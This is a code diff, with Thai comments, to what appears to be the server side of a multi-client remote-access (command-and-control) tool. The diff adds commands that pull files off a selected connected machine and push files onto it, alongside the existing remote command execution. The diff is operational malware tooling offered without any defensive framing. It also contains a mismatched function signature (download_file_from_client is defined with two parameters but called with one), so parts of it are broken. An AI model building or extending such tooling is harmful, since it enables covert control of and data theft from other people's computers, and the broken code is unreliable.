@@ -8,6 +8,7 @@ import os
 import threading
 import time
 import hashlib
+import base64
 
 class SecureConnection:
     def __init__(self):
@@ -75,7 +76,6 @@ class Allclients:
         except Exception as e:
             print(f"[-] Client managing error: {str(e)}")
         finally:
-            # ตรวจสอบว่า client_id มีค่าก่อนที่จะลบ
             if client_id and client_id in self.clients:
                 del self.clients[client_id]
                 del self.client_details[client_id]
@@ -138,6 +138,65 @@ class Allclients:
                 print(f"[-] Connection error: {str(e)}")    
 
 
+    def download_file_from_client(self, file_path, content):
+        if not self.active_client:
+            return "[-] No active client selected"
+        try:
+            # บอกให้ client ส่งไฟล์
+            connection = self.clients[self.active_client]
+            self.connect_send(connection, ["download", file_path])
+            response = self.connect_receive(connection)
+            
+            if isinstance(response, str) and response.startswith("[-]"):
+                return response
+                
+            # บันทึกไฟล์ในโฟลเดอร์ปัจจุบัน
+            current_dir = os.getcwd()
+            save_path = os.path.join(current_dir, os.path.basename(file_path))
+            
+            with open(save_path, "wb") as file:
+                file.write(base64.b64decode(response))
+            return f"[+] Downloaded {file_path} to {save_path}"
+        except Exception as e:
+            return f"[-] Download error: {str(e)}"
+
+    def up_file_to_client(self, file_path):
+        if not self.active_client:
+            return "[-] No active client selected"
+        try:
+            # อ่านไฟล์จากโฟลเดอร์ที่อยู่
+            current_dir = os.getcwd()
+            file_path = os.path.join(current_dir, file_path)
+            
+            if not os.path.exists(file_path):
+                return f"[-] File not found: {file_path}"
+            
+            with open(file_path, "rb") as file:
+                file_data = base64.b64encode(file.read()).decode()
+            
+            # ส่งไฟล์ไปยัง client
+            connection = self.clients[self.active_client]
+            filename = os.path.basename(file_path)
+            self.connect_send(connection, ["upload", filename, file_data])
+            return self.connect_receive(connection)
+        except Exception as e:
+            return f"[-] Upload error: {str(e)}"
+
+    def manage_file_commands(self, command):
+        try:
+            if command[0] == "download":
+                if len(command) < 2:
+                    return "[-] Usage: download <file_path>"
+                return self.download_file_from_client(command[1])
+                
+            elif command[0] == "upload":
+                if len(command) < 2:
+                    return "[-] Usage: upload <file_path>"
+                return self.up_file_to_client(command[1])
+                
+        except Exception as e:
+            return f"[-] File operation error: {str(e)}"
+
 
     def execute_cmd(self, cmd: list):
         if not self.active_client:
@@ -174,6 +233,11 @@ class Allclients:
                         print("[-] Usage: select <client_id>.")
                     self.select_client(cmd_parts[1])
                 
+                elif base_cmd in ["upload", "download"]:
+                    result = self.manage_file_commands(cmd_parts)
+                    print(result)
+                    continue
+
                 elif base_cmd == "exit":
                     print("[!] Shutting down server....")
                     break
